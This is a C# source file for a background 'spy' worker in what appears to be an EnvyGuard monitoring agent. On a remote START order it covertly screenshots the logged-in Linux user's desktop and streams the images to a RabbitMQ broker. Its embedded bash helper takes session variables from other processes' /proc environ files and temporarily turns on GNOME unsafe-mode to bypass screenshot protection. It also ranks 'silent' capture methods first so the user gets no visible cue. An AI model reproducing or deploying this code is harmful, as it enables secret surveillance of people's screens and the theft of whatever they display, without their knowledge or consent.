using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using RabbitMQ.Client;
using RabbitMQ.Client.Events;
using System.Net;
using System.Net.Sockets;

namespace EnvyGuard.Agent.Services;

public class ScreenSpyWorker : BackgroundService
{
    private readonly IConfiguration _config;
    private readonly ILogger<ScreenSpyWorker> _logger;
    private bool _isSpying = false; // Empieza dormido
    private string _pcId = Environment.MachineName;

    public ScreenSpyWorker(IConfiguration config, ILogger<ScreenSpyWorker> logger)
    {
        _config = config;
        _logger = logger;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        // Leer configuración del appsettings o variables de entorno
        var factory = new ConnectionFactory
        {
            HostName = _config["RabbitMQ:HostName"] ?? "localhost",
            UserName = _config["RabbitMQ:UserName"] ?? "guest",
            Password = _config["RabbitMQ:Password"] ?? "guest",
            VirtualHost = _config["RabbitMQ:VirtualHost"] ?? "/"
        };

        while (!stoppingToken.IsCancellationRequested)
        {
            try
            {
                _logger.LogInformation($"🕵️ [SPY] Iniciando módulo de vigilancia en {_pcId}...");
                
                using var connection = await factory.CreateConnectionAsync(stoppingToken);
                using var channel = await connection.CreateChannelAsync(cancellationToken: stoppingToken);

                // 1. Configurar Canal de Control (Escuchar órdenes START/STOP)
                // CORRECCIÓN: El servidor tiene este exchange como Durable=true. Debemos coincidir.
                await channel.ExchangeDeclareAsync(exchange: "spy.control", type: ExchangeType.Fanout, durable: true, autoDelete: false, arguments: null, cancellationToken: stoppingToken);
                var queueName = (await channel.QueueDeclareAsync(cancellationToken: stoppingToken)).QueueName;
                await channel.QueueBindAsync(queueName, "spy.control", "", cancellationToken: stoppingToken);

                var consumer = new AsyncEventingBasicConsumer(channel);
                consumer.ReceivedAsync += async (model, ea) =>
                {
                    var body = ea.Body.ToArray();
                    var message = Encoding.UTF8.GetString(body).Trim().Trim('"').ToUpper();
                    _logger.LogInformation($"📣 [SPY] Orden recibida: {message}");

                    if (message.Contains("START")) { _isSpying = true; _logger.LogInformation("🟢 [SPY] Modo ACTIVO - Iniciando capturas"); }
                    if (message.Contains("STOP")) { _isSpying = false; _logger.LogInformation("🔴 [SPY] Modo INACTIVO - Detenido"); }
                };
                await channel.BasicConsumeAsync(queueName, autoAck: true, consumer: consumer, cancellationToken: stoppingToken);

                // 2. Bucle de Vigilancia
                string lastHash = "";
                int iterationsSinceLastSend = 0;
                
                while (connection.IsOpen && !stoppingToken.IsCancellationRequested)
                {
                    if (_isSpying)
                    {
                        byte[]? imageBytes = await CapturarYOptimizarLinux();
                        
                        if (imageBytes != null && imageBytes.Length > 0)
                        {
                            string currentHash = CalcularHash(imageBytes);
                            _logger.LogInformation($"🔍 [SPY] Imagen procesada. Tamaño: {imageBytes.Length} bytes. Hash: {currentHash.Substring(0, 8)}...");

                            if (currentHash != lastHash || iterationsSinceLastSend >= 10)
                            {
                                if (currentHash == lastHash) 
                                    _logger.LogInformation("🔄 [SPY] Forzando envío de imagen estática (heartbeat de video)");

                                string base64Image = Convert.ToBase64String(imageBytes);
                                
                                var payload = new { 
                                    PcId = _pcId, 
                                    ImageBase64 = base64Image, 
                                    Timestamp = DateTime.UtcNow 
                                };
                                
                                var body = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(payload));

                                // Enviar al Topic
                                var props = new BasicProperties 
                                { 
                                    Priority = 0,
                                    ContentType = "application/json",
                                    DeliveryMode = DeliveryModes.Persistent
                                };
                                
                                try 
                                {
                                    await channel.BasicPublishAsync(exchange: "amq.topic", routingKey: "spy.screens", mandatory: false, basicProperties: props, body: body, cancellationToken: stoppingToken);
                                    _logger.LogInformation($"📸 [SPY] Foto enviada: {imageBytes.Length / 1024} KB (PC: {_pcId})");
                                    lastHash = currentHash;
                                    iterationsSinceLastSend = 0;
                                }
                                catch (Exception pushEx)
                                {
                                    _logger.LogError($"❌ [SPY] Error publicando en RabbitMQ: {pushEx.Message}");
                                }
                            }
                            else 
                            {
                                _logger.LogInformation("⏭️ [SPY] Imagen idéntica a la anterior. Omitiendo envío.");
                                iterationsSinceLastSend++;
                            }
                        }
                        else 
                        {
                            _logger.LogWarning("⚠️ [SPY] La captura retornó 0 bytes o null.");
                        }
                        
                        // Esperar un poco para no saturar
                        await Task.Delay(2000, stoppingToken);
                    }
                    else
                    {
                        await Task.Delay(2000, stoppingToken); // Dormido
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.LogError($"⚠️ [SPY] Error: {ex.Message}. Reintentando en 5s...");
                await Task.Delay(5000, stoppingToken);
            }
        }
    }

    // --- MÉTODOS AUXILIARES (Copiados de tu versión exitosa) ---

    private async Task<byte[]?> CapturarYOptimizarLinux()
    {
        string tempFile = $"/tmp/spy_{Guid.NewGuid()}.jpg";
        try
        {
            _logger.LogInformation($"📷 [SPY] Capturando pantalla a {tempFile}...");
            
            // Crear script de captura robusto (SIEMPRE SOBREESCRIBIR)
            string scriptPath = "/tmp/capture_helper.sh";
            string scriptContent = @"#!/bin/bash
OUTPUT=$1

# Función para buscar variables en procesos del usuario
function find_session_vars() {
    # Buscar procesos de interfaz gráfica
    for pid in $(pgrep -u $1 'gnome-shell|Xorg|kwin|xfwm4|lxsession'); do
        if [ -f /proc/$pid/environ ]; then
            ENV_CONTENT=$(cat /proc/$pid/environ | tr '\0' '\n')
            DISP=$(echo ""$ENV_CONTENT"" | grep '^DISPLAY=' | cut -d= -f2-)
            WDISP=$(echo ""$ENV_CONTENT"" | grep '^WAYLAND_DISPLAY=' | cut -d= -f2-)
            XAUTH=$(echo ""$ENV_CONTENT"" | grep '^XAUTHORITY=' | cut -d= -f2-)
            DBUS=$(echo ""$ENV_CONTENT"" | grep '^DBUS_SESSION_BUS_ADDRESS=' | cut -d= -f2-)
            RUNDIR=$(echo ""$ENV_CONTENT"" | grep '^XDG_RUNTIME_DIR=' | cut -d= -f2-)
            XDATAD=$(echo ""$ENV_CONTENT"" | grep '^XDG_DATA_DIRS=' | cut -d= -f2-)
            
            # Fallback corregido para XAUTH
            if [ -z ""$XAUTH"" ] && [ -f ""/home/$1/.Xauthority"" ]; then
                XAUTH=""/home/$1/.Xauthority""
            fi

            if [ -n ""$DISP"" ] || [ -n ""$WDISP"" ]; then
                export DISPLAY=$DISP
                export WAYLAND_DISPLAY=$WDISP
                export XAUTHORITY=$XAUTH
                export DBUS_SESSION_BUS_ADDRESS=$DBUS
                export XDG_RUNTIME_DIR=$RUNDIR
                export XDG_DATA_DIRS=$XDATAD
                return 0
            fi
        fi
    done
    return 1
}

# 1. Identificar al usuario real
REAL_USER=""""
for uid_dir in /run/user/[0-9]*; do
    uid=$(basename $uid_dir)
    user_name=$(id -nu $uid 2>/dev/null)
    if [ -n ""$user_name"" ] && [ ""$user_name"" != ""messagebus"" ] && [ ""$user_name"" != ""root"" ]; then
        REAL_USER=$user_name
        find_session_vars $REAL_USER && break
    fi
done

echo ""INFO:USER=$REAL_USER DISPLAY=$DISPLAY WAYLAND=$WAYLAND_DISPLAY XAUTH=$XAUTHORITY""

# 3. Intentar capturar (Prioridad: Silencioso > Wayland > Flash)

# Función para validar si la imagen es válida (no negra/vacía)
function is_valid() {
    [ -s ""$1"" ] || return 1
    size=$(stat -c%s ""$1"")
    if [ $size -lt 45000 ]; then
        echo ""DEBUG: image too small ($size bytes), probably black screen.""
        rm -f ""$1""
        return 1
    fi
    return 0
}

# Opción 0: FFmpeg (Intento simple)
FFMPEG_CMD=$(command -v ffmpeg || echo ""/usr/bin/ffmpeg"")
if [ -x ""$FFMPEG_CMD"" ]; then
    if [ -e /dev/dri/card0 ]; then
         # Solo probamos nv12 una vez, si falla, adiós.
         ERR=$($FFMPEG_CMD -y -t 1 -v error -device /dev/dri/card0 -f kmsgrab -i - -vf 'hwdownload,format=nv12' -frames:v 1 ""$OUTPUT"" 2>&1)
         if is_valid ""$OUTPUT""; then echo ""METHOD:ffmpeg-kms-card0-silent"" && exit 0; fi
         LAST_FFMPEG_ERR=$ERR
    fi
    echo ""DEBUG:ffmpeg_fail=$LAST_FFMPEG_ERR""
fi

# Opción A: D-Bus GNOME (Silent - Requiere Unsafe Mode)
if [ -n ""$DBUS_SESSION_BUS_ADDRESS"" ]; then
    # Intentamos activar unsafe-mode en los esquemas conocidos "a la fuerza"
    # GNOME Shell
    ERR_SHELL=$(sudo -u $REAL_USER env DBUS_SESSION_BUS_ADDRESS=$DBUS_SESSION_BUS_ADDRESS XDG_DATA_DIRS=$XDG_DATA_DIRS gsettings set org.gnome.shell unsafe-mode true 2>&1)
    # GNOME Mutter (por si acaso)
    ERR_MUTTER=$(sudo -u $REAL_USER env DBUS_SESSION_BUS_ADDRESS=$DBUS_SESSION_BUS_ADDRESS XDG_DATA_DIRS=$XDG_DATA_DIRS gsettings set org.gnome.mutter unsafe-mode true 2>&1)
    
    # Check si se activó
    MODE_CHECK=$(sudo -u $REAL_USER env DBUS_SESSION_BUS_ADDRESS=$DBUS_SESSION_BUS_ADDRESS XDG_DATA_DIRS=$XDG_DATA_DIRS gsettings get org.gnome.shell unsafe-mode 2>/dev/null)

    ERR=$(sudo -u $REAL_USER env DISPLAY=$DISPLAY WAYLAND_DISPLAY=$WAYLAND_DISPLAY \
    XDG_RUNTIME_DIR=$XDG_RUNTIME_DIR DBUS_SESSION_BUS_ADDRESS=$DBUS_SESSION_BUS_ADDRESS XDG_DATA_DIRS=$XDG_DATA_DIRS \
    gdbus call --session --dest org.gnome.Shell.Screenshot --object-path /org/gnome/Shell/Screenshot \
    --method org.gnome.Shell.Screenshot.Screenshot true false ""$OUTPUT"" 2>&1)

    # Restaurar seguridad
    sudo -u $REAL_USER env DBUS_SESSION_BUS_ADDRESS=$DBUS_SESSION_BUS_ADDRESS XDG_DATA_DIRS=$XDG_DATA_DIRS gsettings set org.gnome.shell unsafe-mode false 2>/dev/null
    sudo -u $REAL_USER env DBUS_SESSION_BUS_ADDRESS=$DBUS_SESSION_BUS_ADDRESS XDG_DATA_DIRS=$XDG_DATA_DIRS gsettings set org.gnome.mutter unsafe-mode false 2>/dev/null
    
    if is_valid ""$OUTPUT""; then echo ""METHOD:gnome-dbus-silent"" && exit 0; 
    else echo ""DEBUG:gdbus_fail=$ERR (unsafe-mode=$MODE_CHECK) (shell_err=$ERR_SHELL) (mutter_err=$ERR_MUTTER)""; fi
fi

# Opción B: grim (Wayland Nativo - Solo funciona en algunos compositores)
if command -v grim >/dev/null && [ -n ""$WAYLAND_DISPLAY"" ]; then
    ERR=$(sudo -u $REAL_USER env WAYLAND_DISPLAY=$WAYLAND_DISPLAY XDG_RUNTIME_DIR=$XDG_RUNTIME_DIR \
    grim ""$OUTPUT"" 2>&1)
    if is_valid ""$OUTPUT""; then echo ""METHOD:grim-wayland-silent"" && exit 0; 
    else echo ""DEBUG:grim_fail=$ERR""; fi
fi

# Opción C: gnome-screenshot (El más compatible en Ubuntu 24.04, aunque tenga flash)
if command -v gnome-screenshot >/dev/null; then
    ERR=$(sudo -u $REAL_USER env DISPLAY=$DISPLAY WAYLAND_DISPLAY=$WAYLAND_DISPLAY \
    XDG_RUNTIME_DIR=$XDG_RUNTIME_DIR DBUS_SESSION_BUS_ADDRESS=$DBUS_SESSION_BUS_ADDRESS \
    gnome-screenshot -f ""$OUTPUT"" 2>&1)
    if is_valid ""$OUTPUT""; then echo ""METHOD:gnome-screenshot-flash"" && exit 0; 
    else echo ""DEBUG:gnome-screenshot_fail=$ERR""; fi
fi

# Opción D: scrot (X11 - Probablemente negro en Wayland)
if command -v scrot >/dev/null; then
    ERR=$(sudo -u $REAL_USER env DISPLAY=$DISPLAY XAUTHORITY=$XAUTHORITY \
    scrot -z -o ""$OUTPUT"" 2>&1)
    if is_valid ""$OUTPUT""; then echo ""METHOD:scrot-X11"" && exit 0; 
    else echo ""DEBUG:scrot_fail=$ERR""; fi
fi

# Opción E: import (ImageMagick)
if command -v import >/dev/null; then
    ERR=$(sudo -u $REAL_USER env DISPLAY=$DISPLAY XAUTHORITY=$XAUTHORITY \
    import -window root ""$OUTPUT"" 2>&1)
    if is_valid ""$OUTPUT""; then echo ""METHOD:import-X11"" && exit 0; 
    else echo ""DEBUG:import_fail=$ERR""; fi
fi

exit 1
";
            await File.WriteAllTextAsync(scriptPath, scriptContent);
            Process.Start("chmod", $"+x {scriptPath}")?.WaitForExit();

            // Ejecutar el script helper
            var psiCapture = new ProcessStartInfo
            {
                FileName = "/bin/bash",
                Arguments = $"-c \"{scriptPath} '{tempFile}'\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardError = true,
                RedirectStandardOutput = true // Capturar stdout para ver el método
            };
            
            using (var p = Process.Start(psiCapture)) { 
                if (p != null) 
                {
                    string output = await p.StandardOutput.ReadToEndAsync();
                    string stderr = await p.StandardError.ReadToEndAsync();
                    await p.WaitForExitAsync();
                    
                    if (!string.IsNullOrWhiteSpace(output))
                         _logger.LogInformation($"ℹ️ [SPY] Captura exitosa usando: {output.Trim()}");

                    // Loguear stderr SIEMPRE si hay algo, para saber por qué falló 'import' aunque 'scrot' funcionara después
                    if (!string.IsNullOrWhiteSpace(stderr))
                         _logger.LogWarning($"⚠️ [SPY] Errores internos durante captura: {stderr}");

                    if (p.ExitCode != 0)
                        _logger.LogWarning($"⚠️ [SPY] Fallaron todos los metodos de captura.");
                }
            }
            
            if (!File.Exists(tempFile))
            {
                _logger.LogWarning($"⚠️ [SPY] Archivo no creado: {tempFile}");
                return null;
            }

            // Leer bytes
            byte[] imageBytes = await File.ReadAllBytesAsync(tempFile);
            
            // Borrar temp
            try { File.Delete(tempFile); } catch { }
            
            return imageBytes;
        }
        catch (Exception ex)
        {
            _logger.LogError($"❌ [SPY] Error capturando: {ex.Message}");
            return null; 
        }

}

    private string CalcularHash(byte[] data)
    {
        using var md5 = MD5.Create();
        return Convert.ToBase64String(md5.ComputeHash(data));
    }
}
